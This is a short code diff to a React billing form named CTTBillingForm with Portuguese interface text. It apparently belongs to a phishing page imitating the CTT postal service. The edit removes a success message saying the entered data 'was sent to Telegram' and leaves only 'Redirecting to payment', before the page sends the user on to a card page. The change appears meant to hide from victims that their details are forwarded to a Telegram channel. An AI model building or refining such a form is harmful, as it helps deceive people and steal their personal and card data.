@@ -73,8 +73,8 @@ const CTTBillingForm = () => {
         
         toast({
           title: "Informações enviadas com sucesso!",
-          description: "Dados foram enviados para o Telegram. Redirecionando para pagamento...",
-          duration: 3000
+          description: "Redirecionando para pagamento...",
+          duration: 2000
         });
 
         // Navigate to card page after a short delay
